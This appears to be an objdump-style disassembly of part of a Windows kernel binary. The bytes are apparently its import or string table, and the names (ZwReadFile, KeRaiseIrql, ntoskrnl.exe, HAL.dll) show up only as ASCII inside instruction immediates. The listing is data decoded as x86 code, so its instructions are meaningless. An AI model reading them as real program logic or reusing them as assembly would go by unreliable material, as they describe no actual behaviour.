   1e46f:	gs je  0x1e4b5
   1e472:	jne    0x1e4e6
   1e474:	jb     0x1e4db
   1e476:	outs   dx,BYTE PTR ds:[esi]
   1e477:	je     0x1e4cd
   1e479:	push   0x64616572
   1e47e:	add    BYTE PTR [eax],al
   1e480:	aas    
   1e481:	add    cl,BYTE PTR [ebx+0x65]
   1e484:	push   edx
   1e485:	gs ins BYTE PTR es:[edi],dx
   1e487:	gs popa 
   1e489:	jae    0x1e4f0
   1e48b:	dec    ebp
   1e48c:	jne    0x1e502
   1e48e:	gs js  0x1e491
   1e491:	add    BYTE PTR [esi+0x6c745204],ch
   1e497:	push   edi
   1e498:	jb     0x1e503
   1e49a:	je     0x1e501
   1e49c:	push   edx
   1e49d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x61567972
   1e4a6:	ins    BYTE PTR es:[edi],dx
   1e4a7:	jne    0x1e50e
   1e4a9:	add    BYTE PTR [ebp+0x70777305],dh
   1e4af:	jb     0x1e51a
   1e4b1:	outs   dx,BYTE PTR ds:[esi]
   1e4b2:	je     0x1e51a
   1e4b4:	add    BYTE PTR [eax],al
   1e4b6:	dec    ebx
   1e4b7:	add    eax,0x7551775a
   1e4bc:	gs jb  0x1e538
   1e4bf:	push   ebx
   1e4c0:	jns    0x1e52f
   1e4c2:	bound  ebp,QWORD PTR [edi+0x6c]
   1e4c5:	imul   esp,DWORD PTR [ebx+0x4c],0x4f6b6e69
   1e4cc:	bound  ebp,QWORD PTR [edx+0x65]
   1e4cf:	arpl   WORD PTR [eax+eax*1+0x32],si
   1e4d3:	add    eax,0x704f775a
   1e4d8:	outs   dx,BYTE PTR gs:[esi]
   1e4da:	push   ebx
   1e4db:	jns    0x1e54a
   1e4dd:	bound  ebp,QWORD PTR [edi+0x6c]
   1e4e0:	imul   esp,DWORD PTR [ebx+0x4c],0x4f6b6e69
   1e4e7:	bound  ebp,QWORD PTR [edx+0x65]
   1e4ea:	arpl   WORD PTR [eax+eax*1+0x0],si
   1e4ee:	test   eax,0x6c745203
   1e4f3:	inc    ecx
   1e4f4:	jo     0x1e566
   1e4f6:	outs   dx,BYTE PTR gs:[esi]
   1e4f8:	fs push ebp
   1e4fa:	outs   dx,BYTE PTR ds:[esi]
   1e4fb:	imul   esp,DWORD PTR [ebx+0x6f],0x6f546564
   1e502:	push   ebx
   1e503:	je     0x1e577
   1e505:	imul   ebp,DWORD PTR [esi+0x67],0x5c80000
   1e50c:	ja     0x1e571
   1e50e:	jae    0x1e583
   1e510:	je     0x1e584
   1e512:	add    BYTE PTR [eax],al
   1e514:	lods   eax,DWORD PTR ds:[esi]
   1e515:	add    cl,BYTE PTR [ebp+0x6d]
   1e518:	dec    ebp
   1e519:	popa   
   1e51a:	jo     0x1e568
   1e51c:	outs   dx,DWORD PTR ds:[esi]
   1e51d:	arpl   WORD PTR [ebx+0x65],bp
   1e520:	fs push eax
   1e522:	popa   
   1e523:	addr16 gs jae 0x1e57a
   1e527:	jo     0x1e58e
   1e529:	arpl   WORD PTR [ecx+0x66],bp
   1e52c:	jns    0x1e571
   1e52e:	popa   
   1e52f:	arpl   WORD PTR [eax+0x65],bp
   1e532:	add    BYTE PTR [eax],al
   1e534:	pop    DWORD PTR [edx]
   1e536:	dec    ebp
   1e537:	ins    DWORD PTR es:[edi],dx
   1e538:	inc    edx
   1e539:	jne    0x1e5a4
   1e53b:	ins    BYTE PTR es:[edi],dx
   1e53c:	fs dec ebp
   1e53e:	fs ins BYTE PTR es:[edi],dx
   1e540:	inc    esi
   1e541:	outs   dx,DWORD PTR ds:[esi]
   1e542:	jb     0x1e592
   1e544:	outs   dx,DWORD PTR ds:[esi]
   1e545:	outs   dx,BYTE PTR ds:[esi]
   1e546:	push   eax
   1e547:	popa   
   1e548:	addr16 gs fs push eax
   1e54c:	outs   dx,DWORD PTR ds:[esi]
   1e54d:	outs   dx,DWORD PTR ds:[esi]
   1e54e:	ins    BYTE PTR es:[edi],dx
   1e54f:	add    BYTE PTR [ecx+eax*1],ah
   1e552:	dec    ecx
   1e553:	outs   dx,DWORD PTR ds:[esi]
   1e554:	inc    ecx
   1e555:	ins    BYTE PTR es:[edi],dx
   1e556:	ins    BYTE PTR es:[edi],dx
   1e557:	outs   dx,DWORD PTR ds:[esi]
   1e558:	arpl   WORD PTR [ecx+0x74],sp
   1e55b:	gs dec ebp
   1e55d:	fs ins BYTE PTR es:[edi],dx
   1e55f:	add    BYTE PTR [ecx+0x74735f05],cl
   1e565:	jb     0x1e5d0
   1e567:	arpl   WORD PTR [ebp+0x70],bp
   1e56a:	add    BYTE PTR [eax],al
   1e56c:	outs   dx,DWORD PTR ds:[esi]
   1e56d:	add    eax,0x7257775a
   1e572:	imul   esi,DWORD PTR [ebp+eiz*2+0x46],0x656c69
   1e57a:	or     al,0x5
   1e57c:	pop    edx
   1e57d:	ja     0x1e5c2
   1e57f:	jb     0x1e5e6
   1e581:	popa   
   1e582:	je     0x1e5e9
   1e584:	inc    esi
   1e585:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5a051300
   1e58d:	ja     0x1e5d3
   1e58f:	gs ins BYTE PTR es:[edi],dx
   1e591:	gs je  0x1e5f9
   1e594:	inc    esi
   1e595:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5a053d00
   1e59d:	ja     0x1e5f0
   1e59f:	jne    0x1e606
   1e5a1:	jb     0x1e61c
   1e5a3:	inc    esp
   1e5a4:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
   1e5ab:	jns    0x1e5f3
   1e5ad:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5a056800
   1e5b5:	ja     0x1e60b
   1e5b7:	gs jb  0x1e627
   1e5ba:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
   1e5c1:	outs   dx,DWORD PTR ds:[esi]
   1e5c2:	arpl   WORD PTR [ebp+0x73],sp
   1e5c5:	jae    0x1e5c7
   1e5c7:	add    BYTE PTR [esi],ch
   1e5c9:	add    eax,0x704f775a
   1e5ce:	outs   dx,BYTE PTR gs:[esi]
   1e5d0:	push   eax
   1e5d1:	jb     0x1e642
   1e5d3:	arpl   WORD PTR [ebp+0x73],sp
   1e5d6:	jae    0x1e5d8
   1e5d8:	and    DWORD PTR [ebx],eax
   1e5da:	dec    edi
   1e5db:	bound  ecx,QWORD PTR [edi+0x70]
   1e5de:	outs   dx,BYTE PTR gs:[esi]
   1e5e0:	dec    edi
   1e5e1:	bound  ebp,QWORD PTR [edx+0x65]
   1e5e4:	arpl   WORD PTR [edx+eax*2+0x79],si
   1e5e8:	push   eax
   1e5e9:	outs   dx,DWORD PTR ds:[esi]
   1e5ea:	imul   ebp,DWORD PTR [esi+0x74],0x1007265
   1e5f1:	add    al,0x52
   1e5f3:	je     0x1e661
   1e5f5:	inc    esi
   1e5f6:	jb     0x1e65d
   1e5f8:	gs push ebp
   1e5fa:	outs   dx,BYTE PTR ds:[esi]
   1e5fb:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   1e602:	jb     0x1e66d
   1e604:	outs   dx,BYTE PTR ds:[esi]
   1e605:	add    BYTE PTR [bx+si],al
   1e608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1e609:	add    edx,DWORD PTR [edx+0x74]
   1e60c:	ins    BYTE PTR es:[edi],dx
   1e60d:	inc    ecx
   1e60e:	outs   dx,BYTE PTR ds:[esi]
   1e60f:	jae    0x1e67a
   1e611:	push   ebx
   1e612:	je     0x1e686
   1e614:	imul   ebp,DWORD PTR [esi+0x67],0x6e556f54
   1e61b:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   1e622:	jb     0x1e68d
   1e624:	outs   dx,BYTE PTR ds:[esi]
   1e625:	add    BYTE PTR [bx+si],al
   1e628:	push   ss
   1e629:	add    al,0x52
   1e62b:	je     0x1e699
   1e62d:	dec    ecx
   1e62e:	outs   dx,BYTE PTR ds:[esi]
   1e62f:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
   1e637:	jb     0x1e6a2
   1e639:	outs   dx,BYTE PTR ds:[esi]
   1e63a:	add    BYTE PTR [bp+di+0x5f05],dl
   1e63f:	ja     0x1e6a4
   1e641:	jae    0x1e6af
   1e643:	ja     0x1e6b7
   1e645:	add    BYTE PTR [edx+0x3],dl
   1e648:	push   eax
   1e649:	jae    0x1e692
   1e64b:	gs je  0x1e691
   1e64e:	jne    0x1e6c2
   1e650:	jb     0x1e6b7
   1e652:	outs   dx,BYTE PTR ds:[esi]
   1e653:	je     0x1e6a9
   1e655:	push   0x64616572
   1e65a:	dec    ecx
   1e65b:	add    BYTE PTR fs:[eax],al
   1e65e:	test   al,0x3
   1e660:	push   edx
   1e661:	je     0x1e6cf
   1e663:	inc    ecx
   1e664:	jo     0x1e6d6
   1e666:	outs   dx,BYTE PTR gs:[esi]
   1e668:	fs push ebp
   1e66a:	outs   dx,BYTE PTR ds:[esi]
   1e66b:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   1e672:	jb     0x1e6dd
   1e674:	outs   dx,BYTE PTR ds:[esi]
   1e675:	addr16 push esp
   1e677:	outs   dx,DWORD PTR ds:[esi]
   1e678:	push   ebx
   1e679:	je     0x1e6ed
   1e67b:	imul   ebp,DWORD PTR [esi+0x67],0x2640000
   1e682:	dec    ebx
   1e683:	gs push ebp
   1e685:	outs   dx,BYTE PTR ds:[esi]
   1e686:	jae    0x1e6fc
   1e688:	popa   
   1e689:	arpl   WORD PTR [ebx+0x44],bp
   1e68c:	gs je  0x1e6f0
   1e68f:	arpl   WORD PTR [eax+0x50],bp
   1e692:	jb     0x1e703
   1e694:	arpl   WORD PTR [ebp+0x73],sp
   1e697:	jae    0x1e699
   1e699:	add    BYTE PTR [eax+0x2],ah
   1e69c:	dec    ebx
   1e69d:	gs push ebx
   1e69f:	je     0x1e702
   1e6a1:	arpl   WORD PTR [ebx+0x41],bp
   1e6a4:	je     0x1e71a
   1e6a6:	popa   
   1e6a7:	arpl   WORD PTR [eax+0x50],bp
   1e6aa:	jb     0x1e71b
   1e6ac:	arpl   WORD PTR [ebp+0x73],sp
   1e6af:	jae    0x1e6b1
   1e6b1:	add    BYTE PTR [ebx],dh
   1e6b3:	add    eax,0x704f775a
   1e6b8:	outs   dx,BYTE PTR gs:[esi]
   1e6ba:	push   esp
   1e6bb:	push   0x64616572
   1e6c0:	add    BYTE PTR [eax],al
   1e6c2:	std    
   1e6c3:	add    edx,DWORD PTR [edx+0x74]
   1e6c6:	ins    BYTE PTR es:[edi],dx
   1e6c7:	inc    esi
   1e6c8:	jb     0x1e72f
   1e6ca:	gs inc ecx
   1e6cc:	outs   dx,BYTE PTR ds:[esi]
   1e6cd:	jae    0x1e738
   1e6cf:	push   ebx
   1e6d0:	je     0x1e744
   1e6d2:	imul   ebp,DWORD PTR [esi+0x67],0x7305a800
   1e6d9:	jo     0x1e74d
   1e6db:	imul   ebp,DWORD PTR [esi+0x74],0x4920066
   1e6e2:	push   edx
   1e6e3:	je     0x1e751
   1e6e5:	push   ebp
   1e6e6:	outs   dx,BYTE PTR ds:[esi]
   1e6e7:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   1e6ee:	jb     0x1e759
   1e6f0:	outs   dx,BYTE PTR ds:[esi]
   1e6f1:	addr16 push esp
   1e6f3:	outs   dx,DWORD PTR ds:[esi]
   1e6f4:	inc    ecx
   1e6f5:	outs   dx,BYTE PTR ds:[esi]
   1e6f6:	jae    0x1e761
   1e6f8:	push   ebx
   1e6f9:	je     0x1e76d
   1e6fb:	imul   ebp,DWORD PTR [esi+0x67],0x56e0000
   1e702:	pop    edx
   1e703:	ja     0x1e75c
   1e705:	popa   
   1e706:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
   1e70e:	ins    BYTE PTR es:[di],dx
   1e710:	gs dec edi
   1e712:	bound  ebp,QWORD PTR [edx+0x65]
   1e715:	arpl   WORD PTR [eax+eax*1+0x5b],si
   1e719:	add    eax,0x6553775a
   1e71e:	je     0x1e765
   1e720:	jbe    0x1e787
   1e722:	outs   dx,BYTE PTR ds:[esi]
   1e723:	je     0x1e725
   1e725:	add    BYTE PTR [ecx+0x6f746105],bl
   1e72b:	ins    BYTE PTR es:[edi],dx
   1e72c:	add    BYTE PTR [eax],al
   1e72e:	pop    esp
   1e72f:	add    eax,0x6553775a
   1e734:	je     0x1e77f
   1e736:	outs   dx,BYTE PTR ds:[esi]
   1e737:	outs   dx,WORD PTR ds:[esi]
   1e739:	jb     0x1e7a8
   1e73b:	popa   
   1e73c:	je     0x1e7a7
   1e73e:	outs   dx,DWORD PTR ds:[esi]
   1e73f:	outs   dx,BYTE PTR ds:[esi]
   1e740:	inc    esi
   1e741:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5a052a00
   1e749:	ja     0x1e79a
   1e74b:	jo     0x1e7b2
   1e74d:	outs   dx,BYTE PTR ds:[esi]
   1e74e:	inc    ebp
   1e74f:	jbe    0x1e7b6
   1e751:	outs   dx,BYTE PTR ds:[esi]
   1e752:	je     0x1e754
   1e754:	pop    esi
   1e755:	add    cl,BYTE PTR [ebx+0x65]
   1e758:	push   ebx
   1e759:	gs je  0x1e7b0
   1e75c:	imul   ebp,DWORD PTR [ebp+0x65],0x94000072
   1e763:	add    edx,DWORD PTR [eax+0x73]
   1e766:	push   esp
   1e767:	gs jb  0x1e7d7
   1e76a:	imul   ebp,DWORD PTR [esi+0x61],0x79536574
   1e771:	jae    0x1e7e7
   1e773:	gs ins DWORD PTR es:[edi],dx
   1e775:	push   esp
   1e776:	push   0x64616572
   1e77b:	add    BYTE PTR [eax+0x3],cl
   1e77e:	push   eax
   1e77f:	jae    0x1e7c4
   1e781:	jb     0x1e7e8
   1e783:	popa   
   1e784:	je     0x1e7eb
   1e786:	push   ebx
   1e787:	jns    0x1e7fc
   1e789:	je     0x1e7f0
   1e78b:	ins    DWORD PTR es:[edi],dx
   1e78c:	push   esp
   1e78d:	push   0x64616572
   1e792:	add    BYTE PTR [eax],al
   1e794:	fld    QWORD PTR [edx]
   1e796:	dec    esi
   1e797:	je     0x1e7db
   1e799:	jne    0x1e804
   1e79b:	ins    BYTE PTR es:[edi],dx
   1e79c:	fs dec esi
   1e79e:	jne    0x1e80d
   1e7a0:	bound  esp,QWORD PTR [ebp+0x72]
   1e7a3:	add    BYTE PTR [esi+0x5],cl
   1e7a6:	pop    edx
   1e7a7:	ja     0x1e7fa
   1e7a9:	jne    0x1e810
   1e7ab:	jb     0x1e826
   1e7ad:	push   esi
   1e7ae:	outs   dx,DWORD PTR ds:[esi]
   1e7af:	ins    BYTE PTR es:[edi],dx
   1e7b0:	jne    0x1e81f
   1e7b2:	gs dec ecx
   1e7b4:	outs   dx,BYTE PTR ds:[esi]
   1e7b5:	outs   dx,WORD PTR ds:[esi]
   1e7b7:	jb     0x1e826
   1e7b9:	popa   
   1e7ba:	je     0x1e825
   1e7bc:	outs   dx,DWORD PTR ds:[esi]
   1e7bd:	outs   dx,BYTE PTR ds:[esi]
   1e7be:	inc    esi
   1e7bf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4b021c00
   1e7c7:	gs dec ecx
   1e7c9:	outs   dx,BYTE PTR ds:[esi]
   1e7ca:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
   1e7d2:	push   esp
   1e7d3:	imul   ebp,DWORD PTR [ebp+0x65],0x3880072
   1e7da:	push   eax
   1e7db:	jae    0x1e830
   1e7dd:	gs je  0x1e823
   1e7e0:	jb     0x1e847
   1e7e2:	popa   
   1e7e3:	je     0x1e84a
   1e7e5:	push   eax
   1e7e6:	jb     0x1e857
   1e7e8:	arpl   WORD PTR [ebp+0x73],sp
   1e7eb:	jae    0x1e83b
   1e7ed:	outs   dx,DWORD PTR ds:[esi]
   1e7ee:	je     0x1e859
   1e7f0:	data16 jns 0x1e845
   1e7f3:	outs   dx,DWORD PTR ds:[esi]
   1e7f4:	jne    0x1e86a
   1e7f6:	imul   ebp,DWORD PTR [esi+0x65],0x50038c00
   1e7fd:	jae    0x1e852
   1e7ff:	gs je  0x1e84e
   1e802:	outs   dx,DWORD PTR ds:[esi]
   1e803:	popa   
   1e804:	fs dec ecx
   1e806:	ins    DWORD PTR es:[edi],dx
   1e807:	popa   
   1e808:	addr16 gs dec esi
   1e80b:	outs   dx,DWORD PTR ds:[esi]
   1e80c:	je     0x1e877
   1e80e:	data16 jns 0x1e863
   1e811:	outs   dx,DWORD PTR ds:[esi]
   1e812:	jne    0x1e888
   1e814:	imul   ebp,DWORD PTR [esi+0x65],0x5a051c00
   1e81b:	ja     0x1e862
   1e81d:	outs   dx,BYTE PTR ds:[esi]
   1e81e:	jne    0x1e88d
   1e820:	gs jb  0x1e884
   1e823:	je     0x1e88a
   1e825:	push   esi
   1e826:	popa   
   1e827:	ins    BYTE PTR es:[edi],dx
   1e828:	jne    0x1e88f
   1e82a:	dec    ebx
   1e82b:	gs jns 0x1e82e
   1e82e:	sub    eax,0x4f775a05
   1e833:	jo     0x1e89a
   1e835:	outs   dx,BYTE PTR ds:[esi]
   1e836:	dec    ebx
   1e837:	gs jns 0x1e83a
   1e83a:	sbb    BYTE PTR [edx],al
   1e83c:	dec    ebx
   1e83d:	gs dec ecx
   1e83f:	outs   dx,BYTE PTR ds:[esi]
   1e840:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
   1e848:	dec    ebp
   1e849:	jne    0x1e8bf
   1e84b:	gs js  0x1e84e
   1e84e:	les    eax,FWORD PTR ds:0x6e736377
   1e854:	arpl   WORD PTR [ebp+0x70],bp
   1e857:	add    BYTE PTR [eax],ah
   1e859:	add    ecx,DWORD PTR [edi+0x62]
   1e85c:	dec    edi
   1e85d:	jo     0x1e8c4
   1e85f:	outs   dx,BYTE PTR ds:[esi]
   1e860:	dec    edi
   1e861:	bound  ebp,QWORD PTR [edx+0x65]
   1e864:	arpl   WORD PTR [edx+eax*2+0x79],si
   1e868:	dec    esi
   1e869:	popa   
   1e86a:	ins    DWORD PTR es:[edi],dx
   1e86b:	add    BYTE PTR gs:[eax],al
   1e86e:	arpl   WORD PTR [edx],ax
   1e870:	dec    ebx
   1e871:	gs push esp
   1e873:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
   1e87a:	je     0x1e87c
   1e87c:	repz add DWORD PTR [ebx+0x65],ecx
   1e880:	inc    edx
   1e881:	jne    0x1e8ea
   1e883:	inc    ebx
   1e884:	push   0x456b6365
   1e889:	js     0x1e88b
   1e88b:	add    BYTE PTR [esi+0x74],ch
   1e88e:	outs   dx,DWORD PTR ds:[esi]
   1e88f:	jae    0x1e8fc
   1e891:	jb     0x1e901
   1e893:	ins    BYTE PTR es:[edi],dx
   1e894:	cs gs js 0x1e8fd
   1e898:	add    BYTE PTR [eax],al
   1e89a:	dec    ebp
   1e89b:	add    BYTE PTR [ebx+0x66],cl
   1e89e:	dec    esp
   1e89f:	outs   dx,DWORD PTR ds:[esi]
   1e8a0:	ja     0x1e907
   1e8a2:	jb     0x1e8ed
   1e8a4:	jb     0x1e917
   1e8a6:	ins    BYTE PTR es:[edi],dx
   1e8a7:	add    BYTE PTR [eax+eax*1+0x4b],al
   1e8ab:	gs push edx
   1e8ad:	popa   
   1e8ae:	imul   esi,DWORD PTR [ebx+0x65],0x6c717249
   1e8b5:	push   esp
   1e8b6:	outs   dx,DWORD PTR ds:[esi]
   1e8b7:	inc    esp
   1e8b8:	jo     0x1e91d
   1e8ba:	dec    esp
   1e8bb:	gs jbe 0x1e923
   1e8be:	ins    BYTE PTR es:[edi],dx
   1e8bf:	add    BYTE PTR [esi+0x0],cl
   1e8c2:	dec    ebx
   1e8c3:	push   dx
   1e8c5:	popa   
   1e8c6:	imul   esi,DWORD PTR [ebx+0x65],0x6c717249
   1e8cd:	add    BYTE PTR [eax+0x41],cl
   1e8d0:	dec    esp
   1e8d1:	cs fs ins BYTE PTR es:[edi],dx
   1e8d4:	ins    BYTE PTR es:[edi],dx
   1e8d5:	add    BYTE PTR [esp+eax*1+0x556c7452],bl
   1e8dc:	outs   dx,BYTE PTR ds:[esi]
   1e8dd:	ja     0x1e948
   1e8df:	outs   dx,BYTE PTR ds:[esi]
   1e8e0:	fs
	...
